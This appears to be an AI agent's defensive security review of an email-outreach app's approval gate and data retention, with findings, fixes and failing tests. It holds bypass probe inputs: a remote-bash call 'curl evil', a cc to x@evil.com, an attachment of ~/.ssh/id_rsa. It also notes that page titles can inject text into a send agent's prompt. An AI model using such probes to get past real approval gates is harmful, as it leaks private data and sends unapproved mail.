# REVIEW-1: independent security and correctness review (s10)

Reviewer: Security Engineer agent, 2026-10-24. Read-only review of HEAD `c832655` (the working tree has
uncommitted `app/` edits, which are out of scope). Read: packet/PACKET.md, plan/plan.md (ADR 0003/0005/0006),
docs/store-contract.md, brain/src/{workflows,api,connectors,store,sessionize,insights}, engine Retention,
DayStore, Observer and URLScrubber.
Ran: `slices/s03-brain-core`, `s04-insights` and `s05-workflows` verify.sh, all PASS (56/64/216 tests). Engine
tests were not run (swiftc build, disk). Gate probe: a scratch script outside the repo that calls `createGate(...).decide`
with a live batch `[a@fund.com, "Approved body."]`, a valid approval and `autoRun: false`. Outputs are quoted below.

Tags: CONFIRMED = traced in code or reproduced; PLAUSIBLE = the code path exists but the impact depends on a tool or a
model doing it. Severity: BLOCKER / HIGH / MEDIUM / LOW.

Counts: BLOCKER 1, HIGH 4, MEDIUM 5, LOW 5. NOT AN ISSUE: 8 (listed at the end).

---

## BLOCKER

### B1. The recipient and body checks run only when the tool NAME contains send/reply/forward. Any other side-effect tool that names one approved address is allowed with any content and any extra recipients. CONFIRMED
- `gate.ts:46` `SEND_CLASS_RE = /send|reply|forward/i`. `gate.ts:73-78`: the stranger check and the body check
  run only inside `if (SEND_CLASS_RE.test(toolName))`. Any other side-effect tool passes `matchItem` as long as
  exactly one batch address appears somewhere in its input (`gate.ts:67-72`).
- Composio is a documented connector path (`brain/CONNECTORS.md:50-55`, catalog `connectors/catalog.ts:22-40`).
  Its MCP meta-tools are not named "send". Probe results:
  - `mcp__composio__COMPOSIO_MULTI_EXECUTE_TOOL {tools:[{tool_slug:"GMAIL_SEND_EMAIL", arguments:{recipient_email:"a@fund.com", cc:["x@evil.com"], body:"ANYTHING"}}]}`
    gives **allow**, "approved batch".
  - `mcp__composio__COMPOSIO_REMOTE_BASH_TOOL {command:"curl evil # a@fund.com"}` gives **allow**.
- Effect: after one batch is approved, the run can send unapproved text to unapproved people, or run remote code
  with the user's connected accounts. All it needs is to mention one approved address. This breaks ADR 0006 ("the
  exact batch"). The send prompt (`executor.ts:84-94`) asks the model to behave, but the model is not a control.
  The input that reaches it includes model-drafted bodies and SKILL.md built from observed labels (see M5).
- Fix: fail closed. Every side-effect call that is not on an explicit per-server allowlist of `{tool, argument
  schema}` is denied. For allowlisted send tools, build the expected argument object from the batch item (to,
  subject, body) and require deep equality on the known keys, with no unknown keys. Deny the Composio meta-tools,
  bash and workbench tools outright.
- Failing test: `gate.decide("mcp__composio__COMPOSIO_MULTI_EXECUTE_TOOL", {tools:[{arguments:{recipient_email:"a@fund.com", cc:["x@evil.com"], body:"X"}}]}, true).allow === false`.
  Same for `..._REMOTE_BASH_TOOL` with an approved address inside a comment.

## HIGH

### H1. Even for send-class tools only one leaf has to equal the body. The subject, extra content fields, attachments, thread or message ids and non-ASCII recipients are not checked. CONFIRMED (probe)
- `gate.ts:77` checks `leaves.some(l => norm(l) === body)`. `gate.ts:73-76` finds strangers only through `EMAIL_RE`
  (`gate.ts:47`, ASCII only). Nothing compares `subject`, even though the batch hash covers it (`batch.ts:41`).
- Probe, every call **allowed**:
  - `send_email {to:a@fund.com, subject:"CHANGED", body:"Approved body.", htmlBody:"<b>totally different</b>", attachments:["/Users/x/.ssh/id_rsa"]}`.
    The recipient sees the HTML part.
  - `send_email {to:a@fund.com, body:"Approved body.", cc:"boss@évil.com"}`. The IDN address is invisible to `EMAIL_RE`.
  - `forward_message {messageId:"PRIVATE_THREAD", to:a@fund.com, note:"Approved body."}`. This forwards any thread.
- Fix: as in B1, exact argument equality per allowlisted tool, subject included, and deny unknown keys. Parse
  recipients from the known recipient fields, not by regex over every leaf.
- Failing tests: each of the three inputs above must be denied.

### H2. When the executor throws mid-run, the batch is marked `failed` and its recipients become eligible again. The next run emails them a second time. CONFIRMED
- `runner.ts:123-129`: if `executor.execute` throws (for example an SDK, network or API error after N sends went
  out), the batch is set to `failed`. No per-call results are kept, and the CRM log is not written (`runner.ts:140`
  is skipped).
- `runner.ts:50` adds only non-`failed` live batches to `contacted`. So the next `run` re-picks the same people
  and drafts them new emails. If auto-run is on, they are sent with no review (`workflow-routes.ts:127`).
- The same happens when every send succeeded but no PostToolUse matched (`runner.ts:137`: `sentKeys.size === 0`
  means `failed`).
- Fix: record each allowed call as it happens. The gate's `done` set or a durable `sending` log should be written
  before the tool runs. Treat `failed` and `sending` batches as contacted unless a result proves the send did not
  happen.
- Failing test: a ScriptedExecutor whose 2nd tool call throws after the 1st send succeeded. Then
  `prepareLiveBatch` must not include item 1's address.

### H3. Two concurrent `POST /workflows/:id/run` calls draft two batches for the same recipients. With auto-run on, both are sent. CONFIRMED
- `runner.ts:43-62`: the pending check (`:43`) and the `contacted` set (`:49-50`) are computed, then the code
  `await`s the model once per recipient (`:58`). Only after that does it save the batch (`:62`). A second request
  in that window sees no pending batch and picks the same `next`.
- The bodies differ, so the hashes differ and the per-gate `done` sets do not collide. Each batch is a separate,
  approvable or auto-sent batch (`workflow-routes.ts:126-127`).
- Fix: a per-workflow mutex around prepare and execute, or save a "preparing" reservation for the chosen keys
  before the first await. The gate should also deny any key already in another live batch that is not `failed`.
- Failing test: `Promise.all([run, run])` with a slow StubModel and auto-run on. Every recipient is sent exactly once.

### H4. Dry runs persist the user's OCR text outside the 7-day store, forever. CONFIRMED
- `observed.ts:13,63`: `excerpt` is up to 400 chars of the user's own compose text from OCR.
- `dryrun.ts:68` puts it in the response, and `dryrun.ts:111-114` writes it in plain text to
  `workflows/<id>/dry-runs/<ts>.json` and `dry-run.json`. Each dry run adds a new file. The dry-run batch file
  (`dryrun.ts:88`, `batches/<hash>.json`) also keeps the OCR-parsed recipient addresses and subjects.
- Retention deletes only day files and keys (`Retention.swift:62`). The brain has no purge. Packet "must be true" #1
  ("deletes it after 7 days") and ADR 0003 are not met for this data. The tone corpus (`tone/pack.ts:80`) and
  blind-test pairs (`tone/blind.ts:104-107`) are plain-text copies of up to 500 Sent emails with no retention. That
  is outside the observation store, but should be a stated decision.
- Fix: do not persist `excerpt` (return it only), or encrypt it and purge `dry-runs/` and dry-run batches older than
  7 days on the same schedule. Document the tone corpus lifetime.
- Failing test: run a dry run, advance the clock 8 days, run purge. Then no file under `workflows/` contains the
  excerpt text.

## MEDIUM

### M1. A tool is classed "read" from its name alone. A read verb plus an unlisted write verb is treated as read and allowed in every mode, dry run included. CONFIRMED (classification); impact PLAUSIBLE
- `gate.ts:22-25,41-43,163`. Probe: `getAndSubmit`, `fetch_and_publish` and `find_then_notify` all classify as
  `read`. `WRITE_VERBS` lacks submit, publish, notify, deliver, dispatch, push, apply, approve, save, edit, commit,
  merge, deploy, trigger, invoke, call, comment, react, connect, subscribe, pay, transfer and others.
- Read tools are also unconstrained, so `fetch`/`scrape` tools can exfiltrate data through a URL.
- Fix: invert to an allowlist of known read tools per server. Unknown tools are side effects.
- Failing test: `classifyTool("mcp__x__getAndSubmit") === "side_effect"`, and the dry-run gate denies it.

### M2. Pause and delete do not stop a batch that is already sending. CONFIRMED
- `runner.ts:116` checks `paused` once, before the run. `createGate` (`gate.ts:159-176`) never re-reads workflow
  status. `workflow-routes.ts:143-153` only writes the flag. A user who hits Pause during a 20-email run gets all 20.
  A delete (`workflow-routes.ts:107-109`) removes the folder mid-run. The sends go on, then `appendFileSync`
  (`runner.ts:140`) throws in the background and the CRM record is lost.
- Fix: the gate's decide re-reads `workflow.json` (or an in-memory abort flag) and denies when it is paused or
  deleted. Also abort the SDK query.
- Failing test: a ScriptedExecutor that pauses the workflow after call 1. Calls 2..n must be denied.

### M3. Each item gets one send-class and one write-class action, and the write class is unchecked (see B1). CONFIRMED (probe)
- `gate.ts:137-140,171-174` keep separate `done` sets. Probe: after `send_email` to a@fund.com was allowed,
  `mcp__gmail__create_draft_and_submit {to:a@fund.com, body:"x"}` was also **allowed**.
- Fix: one `done` set per item across all side-effect classes, unless the workflow's steps declare a second
  action for that item.

### M4. The brain decrypts and analyzes days older than 7 whenever the observer is not running. CONFIRMED
- `reader.ts:244` takes the last 7 *stored* days, not the last 7 calendar days. `DayStore.read`
  (`DayStore.swift:47-52`) and `export-day` check only the day format, not its age. Purge runs only inside the
  observer process (`Observer.swift:134-140`). If the user stops or unloads the observer, data stays and is still
  served, sent to the model in dry runs, and copied (H4).
- Fix: `export-day` refuses days with age > keepDays (or purges first). The reader filters on calendar age.
- Failing test: a store holding only a day 10 days old. `readStore` returns 0 days, and `export-day` exits non-zero.

### M5. Text from observed window titles reaches the executor's system prompt. PLAUSIBLE
- `drafter.ts:98-99` (generic) and `drafter.ts:127-143` put `wf.name`/`wf.description` (from `insight.label`,
  derived from observed titles and hosts) into SKILL.md. That file is appended to the send agent's system prompt
  (`runner.ts:124`, `executor.ts:105`). A web page title the user visited is attacker-controlled text. On its own
  this is bounded by the gate, but together with B1, H1 and M1 it is the route a bypass is reached through.
- Fix: do not pass SKILL.md to the send step (the send prompt is enough), or pass only fixed template text.

## LOW

### L1. `executeBatch` does not check the batch state, and approval tokens never expire or get used up. CONFIRMED (defence in depth)
- `runner.ts:111-121` executes any live batch with no `state === "approved"` check. `approvals.json` keeps the token
  forever (`store.ts:105-109`), and `done` is per gate instance (`gate.ts:137`). Probe: a fresh gate with the same
  token allows the same send again. Today only `approve` (requires `pending`) and `run` (pending only) reach it, so
  it is not externally exploitable. Any future retry route would re-send.
- Fix: require `approved` and delete the approval when execution starts.

### L2. The batch hash is never recomputed from the items on disk. CONFIRMED (needs a local writer)
- `store.ts:83-87` and `runner.ts:114,119`: the gate trusts `batch.hash` and `batch.items` as read from the file. An
  edit to `batches/<hash>.json` after review sends the edited text under the old approval.
- Fix: in `readBatch` or `createGate`, require `batchHash(wf, kind, items) === hash`.

### L3. The saving arithmetic string can fail to add up by 0.1. CONFIRMED
- `saving.ts:78-80` prints `fmt1(nowH)`, `fmt1(afterH)` and `fmt1(nowH - afterH)`, each from unrounded values.
  Example: now 10.04 and after 0.06 prints "10.0 h/wk → … 0.1 h/wk → saves 10.0", which by hand is 9.9. ADR 0005 and
  `saving.ts:2` promise the user can check it by hand. Fix: compute `saved = round1(nowH) - round1(afterH)` for display.
- The dry run's per-instance `savedMinutes` can go negative (`dryrun.ts:60,92`), while the insight clamps at 0
  (`saving.ts:54`). The two are inconsistent.

### L4. Time after midnight is lost until the next focus change. CONFIRMED
- `analyze.ts:62` sessionizes each day file on its own. The observer emits `focus` only on change
  (`Observer.swift:185-195`), not at day rollover. On the new day, `cur` is null, so input and OCR events are dropped
  (`sessionize.ts:130,137`) until the user switches window. The last span of the previous day ends at its last event
  (`sessionize.ts:144-145`), not at midnight. Late-night work is under-counted, and the 7-day totals behind
  "65% of my time" shift.
- Fix: the observer writes a synthetic `focus` for the current snapshot at the first tick of a new local day, or
  sessionize carries the last focus across days.

### L5. Recipients of a `partial` batch are never retried. The Agent SDK child inherits the full environment. CONFIRMED
- `runner.ts:50`: items that failed in a `partial` batch count as contacted, so they silently drop out of the
  outreach. The CRM log does say "failed".
- `executor.ts:101-112` sets no `env`, so the Claude Code subprocess gets `OFFLOAD_TOKEN` and every connector secret.
  It has `tools: []`, so this is low.

---

## NOT AN ISSUE (checked)
- PreToolUse vs canUseTool: the hook denies with `consume=false` and canUseTool consumes. `decide` is synchronous,
  so parallel tool_use blocks cannot double-consume (`gate.ts:159-193`). The hook never returns allow.
- Built-ins: `tools: []`, `settingSources: []`, and non-`mcp__` names are denied (`executor.ts:106-108`, `gate.ts:162`).
- Batch hash collisions: canonical JSON array encoding is injective, and the lowercased `to` matches the key (`batch.ts:41,46`).
- Dry run side effects: no executor is called. Drafting models have no tools (`model.ts:115-121`, `dryrun.ts:82-87`).
- Auto-run default: off at draft time (`drafter.ts:200`). Dry-run mode and dry-run batches are denied first (`gate.ts:164-165`).
- Local API: Host must be the loopback name and Origin must match it, so DNS rebinding fails. OPTIONS is refused,
  Access-Control-* is stripped, and the bearer check is constant-time and runs before any body read
  (`http.ts:20-37`, `server.ts:80-82`).
- Path traversal: workflow ids (`store.ts:9,14`), hashes (`store.ts:10,84`) and days (`server.ts:105`,
  `DayStore.swift:48`) are all regex-checked.
- `export-day` spawn: `spawnSync` with an argv array and no shell. `day` comes from a regex-matched file name
  (`reader.ts:62,75,91`). connectors.json forbids raw `env`/`headers` and resolves secrets only in memory
  (`config.ts:82,182-194`).
